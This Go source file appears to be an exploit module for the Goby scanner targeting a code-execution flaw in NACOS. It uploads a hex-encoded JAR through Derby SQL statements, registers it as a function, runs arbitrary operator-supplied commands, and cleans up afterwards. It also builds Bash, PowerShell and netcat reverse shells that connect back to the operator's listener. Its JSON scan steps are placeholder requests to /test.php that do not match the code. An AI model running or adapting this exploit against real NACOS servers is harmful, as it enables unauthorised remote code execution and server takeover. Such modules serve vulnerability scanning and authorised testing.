package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "NACOS /nacos/v1/cs/ops/data/removal Code Execution Vulnerability",
    "Description": "<p>NACOS is a new open source project launched by Alibaba. It is a dynamic service discovery, configuration management and service management platform that is easier to build cloud-native applications. Committed to helping to find, configure and manage microservices. NACOS provides a set of simple and easy-to-use features that can quickly realize dynamic service discovery, service configuration, service metadata and traffic management.</p><p>NACOS /nacos/v1/cs/ops/data/removal has a code execution vulnerability, through which an attacker can execute code arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2024-07-15",
    "PostTime": "2024-07-16",
    "Author": "songzhenhong@baimaohui.net",
    "FofaQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"||protocol=\"nacos\"||protocol=\"nacos(http)\"",
    "GobyQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"||protocol=\"nacos\"||protocol=\"nacos(http)\"",
    "Level": "3",
    "Impact": "<p>NACOS /nacos/v1/cs/ops/data/removal has a code execution vulnerability, through which an attacker can execute code arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability yet. You can follow the release of the latest official security version: <a href=\"https://nacos.io/zh-cn/index.html.\">https://nacos.io/zh-cn/index.html.</a> </p><p>2. Set the access policy and whitelist access through security devices such as firewalls. </p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "NACOS /nacos/v1/cs/ops/data/removal 代码执行漏洞",
            "Product": "NACOS",
            "Description": "<p>NACOS 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><p>NACOS&nbsp;/nacos/v1/cs/ops/data/removal 存在代码执行漏洞，攻击者可以通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，可关注官方最新安全版本发布情况：<a href=\"https://nacos.io/zh-cn/index.html\">https://nacos.io/zh-cn/index.html</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>NACOS /nacos/v1/cs/ops/data/removal 存在代码执行漏洞，攻击者可以通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "NACOS /nacos/v1/cs/ops/data/removal Code Execution Vulnerability",
            "Product": "NACOS",
            "Description": "<p>NACOS is a new open source project launched by Alibaba. It is a dynamic service discovery, configuration management and service management platform that is easier to build cloud-native applications. Committed to helping to find, configure and manage microservices.&nbsp;NACOS provides a set of simple and easy-to-use features that can quickly realize dynamic service discovery, service configuration, service metadata and traffic management.</p><p>NACOS /nacos/v1/cs/ops/data/removal has a code execution vulnerability, through which an attacker can execute code arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability yet. You can follow the release of the latest official security version: <a href=\"https://nacos.io/zh-cn/index.html.\">https://nacos.io/zh-cn/index.html.</a>&nbsp;</p><p>2. Set the access policy and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If it is not necessary, public network access to the system is prohibited.<br></p>",
            "Impact": "<p>NACOS /nacos/v1/cs/ops/data/removal has a code execution vulnerability, through which an attacker can execute code arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.<br><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10970"
}`

	/*
	  "ExpParams": [
	    {
	      "name": "attackType",
	      "type": "select",
	      "value": "cmd,reverse",
	      "show": ""
	    },
	    {
	      "name": "cmd",
	      "type": "input",
	      "value": "whoami",
	      "show": "attackType=cmd"
	    },
	    {
	      "name": "reverse",
	      "type": "select",
	      "value": "ByBashBase64,ByPowershellBase64,ByBash,ByPowershell,BySh,ByNcBsd",
	      "show": "attackType=reverse"
	    }
	  ],
	*/
	setPayloadRequest_FCrJJZuleDUaWE7e27S3X3TH9liqk8PG := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		command = url.QueryEscape(command)
		randomStr := goutils.RandomHexString(16)
		namespace := ""
		for i := 0; i < 20; i++ {
			namespace = goutils.RandomHexString(8)
			PostRequestConfig := httpclient.NewPostRequestConfig("/nacos/v1/cs/ops/data/removal")
			PostRequestConfig.VerifyTls = false
			PostRequestConfig.Timeout = 15
			PostRequestConfig.FollowRedirect = false
			PostRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary="+randomStr)
			PostRequestConfig.Data = "--" + randomStr + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n\r\nCALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304140008080800f888ec58000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b030414000808080041a477530000000000000000000000000a0000002e636c61737370617468758fcb0ac2301045d7fa15257ba7ba73d12822151454d0ea566232b4d138297914fd7b2d288ad0ddcc70ee706e36bddf4cd2a0f3da12672318b204495aa5a9e4ec502c0663369df4336984f7b508d5a4dffb2e48c13d92ab26c599b4c492f6c8997525a034baf6081715c08848b27a7d84d52e3fcdb79b62b6dce4bbf49fd314d09130a0f01c4b88fa9d4407fb204809a78eebe25163ba128dd8e783118c59da69e49dfc18b563376863a863f8b0674d2d9ba53f9d9f504b07089cd2c70cb600000027010000504b030414000808080041a47753000000000000000000000000080000002e70726f6a6563747590410ec2201444d7f6140d7b41772e285d68bc807a00849f86a60502b4f1f842c1c69ab89b19e6ff07d0f6350ef50cce2ba31b74c407548316462add35e871bfee4fa86515b5cef420c205bc70ca865866d58e6a3e020be003b64650b2d8180b338ea003a3e4a3625836f8a4c9b7794e6a90370b229ae2ce718c6b99820231aec32006653de05e062c8c8b82cf7ce9835be17180bb6e4a549f2dd9784a7e0825281788b43039c8d5acffb3f379422fbdb46b1d5fdfb8f9b237504b0708fc3d8721ba0000006f010000504b0304140008080800f488ec5800000000000000000000000016000000746573742f706f632f4578616d706c652e636c6173738d556b731355187e4e73399b746921504a00b9782969691b44504cb02a50b418526cb13554d16db2095b926cdc6ca015efe2fd7e9df19b337e808fe88794b1337ed419ff8d7fc0fa9c4dd20b0d23ed4cced9f3beeff3bcd773fefef7f73f001cc18f121d029b5db3eac62b76363e3a6f942a4553c2cfd339e38a112f1ae5427c7c76ceccba02c1e356d97247047cb1fe2901ff493b6786e1434847004181ee945536d3b5d2ace99c37668ba6402465678de294e158eabb79e8772f595525bb93374959c9b0ca02db6333a955fe49d7b1ca8564ff94862d029a55c9dae5bc55084360ab8e6de8a19d396f6605fa626dcc361e85d08ba8c48e75514e2e545db3a46327763142bbc6807b1aa6961d3f473b97d6a6514a86711ff64aec217b1bb18e7dd82f202beaa8c8587adaf9a4d2673805a6616b9b48c9ef98ae4ad10691c401a6e7cee313b57cde74c2e84348c38040a0e6e6878e6918a4237675b86c9458a85e0ceb88ab6c75164cf79c63574cc75dd0f03095a6ad72cebe5a0de3111c9538b23e311e858e47f19840b8ea1a8e5b9db6dc4b7709ed8286c7194061f67218493c21715c60cbaada44adec5a2553c7089e241c3d699e28b8b5b56a1e2715cad3aacc27040efc4f7d1954d6ac5669730aa72546d73137853a9ec1b3025d641e2b576acdb209f4b6d859cf350266fc8c40b48d64c234722ae96348a901382b30106b8bd0aefe12e3ad3a52bb513f33d7824ce3790539c1f658856c0869abea7c5ec70b6017058d4ac52ce70406efa9f51b4449c5f0a28e0c2e709ee8634e4daec0b6589b619178899296138dc369c772959f330849bc72e720b4a41761a82866d745d1107a51e49097305bd61ee7e87cd6acb8965dd651003bacbbd2982c237bf9bc6364a9bc23966a43e6e1cd604ec765751305b245bb6a2a0fe6243883bd1bf36015994c0d15a6707462627c221146098ef277bf427275d4bcecb876c34289afaaa4cf0b0cdd63ae3d8ea4b27455cd5c8937d6e46a6c7c255ace4bb6c4220abab3b54d3f0b74cce619fbddeac909ce5e329caaba348276356da871f2e5d535dbd3b62529b5aa8ec0ae76d266a329526785744397aadbbae8b58d305768d617912ac1ab5e7dd8eba9762d946cdd944aa5a76d65053679f53f6b54bc0744e2bbb5495c3bc2e149bbe664cdd3967a66f4e6ab32ac54b19f8f850feacfc71d9f2bfe4a7ec5b90aae81814568bf72d381307f83de6127ff01bda1c07513d710bad0dd343e43ed0eae5d91cdb77959ff86ed07ebd8bd8ad2e5517611ad9bb65b3cb4ed0d0bdc8f073c1e0d0fe221e285d443d6c0ede8879fdfc0cd25f46516113b1be94f470edec650c21ff5ff89cd517fe4501d877f4230722c7d1b89813a9e4a91fa6422b084b14c3430b488e712c125a433d1e022ce25a4486837101e8c6a754c4e47651dd39984f6d7f23f377022bd841992bc9cf02fe16226ea5fc4ab89c05034504736eaafc352bbe20d04145e2913b117f19a3aafd671a58e855b8375bc7e8b31693038d039bc8d4ff039ae317295810b8c178c4be3ebd3891d8820ca52ec64ccbb31c877f430f6f021d8cb3b741f52948c332f535c0d6a98cc4b9963b3800344edc7750c10fb20bec4307ec1212f9bd7bd9adcc49bd405118fe12dea0aca03cd9d869ff10edea5879d447e8f7a3e7a318ef7b9f3933f4e8c0fa83dc27a7c888f589131faf93199243deac1a7d4d3e8cb083e635c3e7a74145fd0073ffd1ac057f89ab6df90bb06b94ca703924fa8441f17b5c3329542dec7a99553896f25c624d29e46709931f89a661012b965061c5cc1c949cc48de64945c13cbec12df0a1c6905bef7daed87ff00504b07080f80d8062a050000d5090000504b01021400140008080800f888ec58b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b0102140014000808080041a477539cd2c70cb6000000270100000a00000000000000000000000000610000002e636c61737370617468504b0102140014000808080041a47753fc3d8721ba0000006f01000008000000000000000000000000004f0100002e70726f6a656374504b01021400140008080800f488ec580f80d8062a050000d509000016000000000000000000000000003f020000746573742f706f632f4578616d706c652e636c617373504b05060000000004000400f8000000ad0700000000'' as blob)', 'C:/Windows/Temp/" + namespace + ".jar', ',', '\"', 'UTF-8', 'C:/Windows/Temp/" + namespace + ".jar')\r\n\r\nCALL sqlj.install_jar('file:///C:/Windows/Temp/" + namespace + ".jar', 'NACOS." + namespace + "', 0)\r\n\r\nCALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS." + namespace + "')\r\n\r\nCREATE FUNCTION S_EXAMPLE_" + namespace + "( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\r\n\r\n--" + randomStr + "--\r\n"
			resp, err := httpclient.DoHttpRequest(hostInfo, PostRequestConfig)
			if err != nil {
				return "", "", err
			}
			if strings.Contains(resp.Utf8Html, "\"message\":null") && strings.Contains(resp.Utf8Html, "\"data\":\"\"") {
				break
			}
			if resp.StatusCode != 200 && !strings.Contains(resp.Utf8Html, "File") {
				return "", "", errors.New("可能不存在漏洞。")
			}
			namespace = goutils.RandomHexString(8)
			PostRequestConfig = httpclient.NewPostRequestConfig("/nacos/v1/cs/ops/data/removal")
			PostRequestConfig.VerifyTls = false
			PostRequestConfig.Timeout = 15
			PostRequestConfig.FollowRedirect = false
			PostRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary="+randomStr)
			PostRequestConfig.Data = "--" + randomStr + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n\r\nCALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304140008080800f888ec58000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b030414000808080041a477530000000000000000000000000a0000002e636c61737370617468758fcb0ac2301045d7fa15257ba7ba73d12822151454d0ea566232b4d138297914fd7b2d288ad0ddcc70ee706e36bddf4cd2a0f3da12672318b204495aa5a9e4ec502c0663369df4336984f7b508d5a4dffb2e48c13d92ab26c599b4c492f6c8997525a034baf6081715c08848b27a7d84d52e3fcdb79b62b6dce4bbf49fd314d09130a0f01c4b88fa9d4407fb204809a78eebe25163ba128dd8e783118c59da69e49dfc18b563376863a863f8b0674d2d9ba53f9d9f504b07089cd2c70cb600000027010000504b030414000808080041a47753000000000000000000000000080000002e70726f6a6563747590410ec2201444d7f6140d7b41772e285d68bc807a00849f86a60502b4f1f842c1c69ab89b19e6ff07d0f6350ef50cce2ba31b74c407548316462add35e871bfee4fa86515b5cef420c205bc70ca865866d58e6a3e020be003b64650b2d8180b338ea003a3e4a3625836f8a4c9b7794e6a90370b229ae2ce718c6b99820231aec32006653de05e062c8c8b82cf7ce9835be17180bb6e4a549f2dd9784a7e0825281788b43039c8d5acffb3f379422fbdb46b1d5fdfb8f9b237504b0708fc3d8721ba0000006f010000504b0304140008080800f488ec5800000000000000000000000016000000746573742f706f632f4578616d706c652e636c6173738d556b731355187e4e73399b746921504a00b9782969691b44504cb02a50b418526cb13554d16db2095b926cdc6ca015efe2fd7e9df19b337e808fe88794b1337ed419ff8d7fc0fa9c4dd20b0d23ed4cced9f3beeff3bcd773fefef7f73f001cc18f121d029b5db3eac62b76363e3a6f942a4553c2cfd339e38a112f1ae5427c7c76ceccba02c1e356d97247047cb1fe2901ff493b6786e1434847004181ee945536d3b5d2ace99c37668ba6402465678de294e158eabb79e8772f595525bb93374959c9b0ca02db6333a955fe49d7b1ca8564ff94862d029a55c9dae5bc55084360ab8e6de8a19d396f6605fa626dcc361e85d08ba8c48e75514e2e545db3a46327763142bbc6807b1aa6961d3f473b97d6a6514a86711ff64aec217b1bb18e7dd82f202beaa8c8587adaf9a4d2673805a6616b9b48c9ef98ae4ad10691c401a6e7cee313b57cde74c2e84348c38040a0e6e6878e6918a4237675b86c9458a85e0ceb88ab6c75164cf79c63574cc75dd0f03095a6ad72cebe5a0de3111c9538b23e311e858e47f19840b8ea1a8e5b9db6dc4b7709ed8286c7194061f67218493c21715c60cbaada44adec5a2553c7089e241c3d699e28b8b5b56a1e2715cad3aacc27040efc4f7d1954d6ac5669730aa72546d73137853a9ec1b3025d641e2b576acdb209f4b6d859cf350266fc8c40b48d64c234722ae96348a901382b30106b8bd0aefe12e3ad3a52bb513f33d7824ce3790539c1f658856c0869abea7c5ec70b6017058d4ac52ce70406efa9f51b4449c5f0a28e0c2e709ee8634e4daec0b6589b619178899296138dc369c772959f330849bc72e720b4a41761a82866d745d1107a51e49097305bd61ee7e87cd6acb8965dd651003bacbbd2982c237bf9bc6364a9bc23966a43e6e1cd604ec765751305b245bb6a2a0fe6243883bd1bf36015994c0d15a6707462627c221146098ef277bf427275d4bcecb876c34289afaaa4cf0b0cdd63ae3d8ea4b27455cd5c8937d6e46a6c7c255ace4bb6c4220abab3b54d3f0b74cce619fbddeac909ce5e329caaba348276356da871f2e5d535dbd3b62529b5aa8ec0ae76d266a329526785744397aadbbae8b58d305768d617912ac1ab5e7dd8eba9762d946cdd944aa5a76d65053679f53f6b54bc0744e2bbb5495c3bc2e149bbe664cdd3967a66f4e6ab32ac54b19f8f850feacfc71d9f2bfe4a7ec5b90aae81814568bf72d381307f83de6127ff01bda1c07513d710bad0dd343e43ed0eae5d91cdb77959ff86ed07ebd8bd8ad2e5517611ad9bb65b3cb4ed0d0bdc8f073c1e0d0fe221e285d443d6c0ede8879fdfc0cd25f46516113b1be94f470edec650c21ff5ff89cd517fe4501d877f4230722c7d1b89813a9e4a91fa6422b084b14c3430b488e712c125a433d1e022ce25a4486837101e8c6a754c4e47651dd39984f6d7f23f377022bd841992bc9cf02fe16226ea5fc4ab89c05034504736eaafc352bbe20d04145e2913b117f19a3aafd671a58e855b8375bc7e8b31693038d039bc8d4ff039ae317295810b8c178c4be3ebd3891d8820ca52ec64ccbb31c877f430f6f021d8cb3b741f52948c332f535c0d6a98cc4b9963b3800344edc7750c10fb20bec4307ec1212f9bd7bd9adcc49bd405118fe12dea0aca03cd9d869ff10edea5879d447e8f7a3e7a318ef7b9f3933f4e8c0fa83dc27a7c888f589131faf93199243deac1a7d4d3e8cb083e635c3e7a74145fd0073ffd1ac057f89ab6df90bb06b94ca703924fa8441f17b5c3329542dec7a99553896f25c624d29e46709931f89a661012b965061c5cc1c949cc48de64945c13cbec12df0a1c6905bef7daed87ff00504b07080f80d8062a050000d5090000504b01021400140008080800f888ec58b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b0102140014000808080041a477539cd2c70cb6000000270100000a00000000000000000000000000610000002e636c61737370617468504b0102140014000808080041a47753fc3d8721ba0000006f01000008000000000000000000000000004f0100002e70726f6a656374504b01021400140008080800f488ec580f80d8062a050000d509000016000000000000000000000000003f020000746573742f706f632f4578616d706c652e636c617373504b05060000000004000400f8000000ad0700000000'' as blob)', '/tmp/" + namespace + ".jar', ',', '\"', 'UTF-8', '/tmp/" + namespace + ".jar')\r\n\r\nCALL sqlj.install_jar('file:///tmp/" + namespace + ".jar', 'NACOS." + namespace + "', 0)\r\n\r\nCALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS." + namespace + "')\r\n\r\nCREATE FUNCTION S_EXAMPLE_" + namespace + "( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\r\n\r\n--" + randomStr + "--\r\n"
			resp, err = httpclient.DoHttpRequest(hostInfo, PostRequestConfig)
			if err != nil {
				return "", "", err
			}
			if strings.Contains(resp.Utf8Html, "\"message\":null") && strings.Contains(resp.Utf8Html, "\"data\":\"\"") {
				break
			}
			if resp.StatusCode != 200 && !strings.Contains(resp.Utf8Html, "File") {
				return "", "", errors.New("可能不存在漏洞。")
			}
		}
		GetRequestConfig := httpclient.NewGetRequestConfig("/nacos/v1/cs/ops/derby?sql=select%20*%20from%20(select%20count(*)%20as%20b%2c%20S_EXAMPLE_" + namespace + "('" + command + "')%20as%20a%20from%20config_info)%20tmp%20%2f*ROWS%20FETCH%20NEXT*%2f")
		GetRequestConfig.VerifyTls = false
		GetRequestConfig.Timeout = 15
		GetRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, GetRequestConfig)
		if err != nil {
			return "", "", err
		}
		commandResult := ""
		re := regexp.MustCompile(`"A":"(.*?)"}`)
		matches := re.FindStringSubmatch(resp.Utf8Html)
		if len(matches) > 1 {
			commandResult = matches[1]
		} else {
			return "", "", errors.New("the result extraction failed")
		}
		for i := 0; i < 20; i++ {
			//删除jar包
			PostRequestConfig := httpclient.NewPostRequestConfig("/nacos/v1/cs/ops/data/removal")
			PostRequestConfig.VerifyTls = false
			PostRequestConfig.Timeout = 15
			PostRequestConfig.FollowRedirect = false
			PostRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary="+randomStr)
			PostRequestConfig.Data = "--" + randomStr + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n\r\nCALL sqlj.remove_jar('NACOS." + namespace + "',0)\r\n\r\n--" + randomStr + "--\r\n"
			resp, err = httpclient.DoHttpRequest(hostInfo, PostRequestConfig)
			if err != nil {
				return "", "", err
			}
			if strings.Contains(resp.Utf8Html, "\"message\":null") && strings.Contains(resp.Utf8Html, "\"data\":\"\"") {
				break
			}
		}

		for i := 0; i < 20; i++ {
			//删除jar包
			PostRequestConfig := httpclient.NewPostRequestConfig("/nacos/v1/cs/ops/data/removal")
			PostRequestConfig.VerifyTls = false
			PostRequestConfig.Timeout = 15
			PostRequestConfig.FollowRedirect = false
			PostRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary="+randomStr)
			PostRequestConfig.Data = "--" + randomStr + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n\r\nDROP FUNCTION S_EXAMPLE_" + namespace + "\r\n\r\n--" + randomStr + "--\r\n"
			resp, err = httpclient.DoHttpRequest(hostInfo, PostRequestConfig)
			if err != nil {
				return "", "", err
			}
			if strings.Contains(resp.Utf8Html, "\"message\":null") && strings.Contains(resp.Utf8Html, "\"data\":\"\"") {
				break
			}
		}

		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		url := "/nacos/v1/cs/ops/data/removal"

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_FCrJJZuleDUaWE7e27S3X3TH9liqk8PG

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text

			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) || strings.Contains(pocRuselt, "Cannot run program \\\"echo\\\"") {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_FCrJJZuleDUaWE7e27S3X3TH9liqk8PG

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
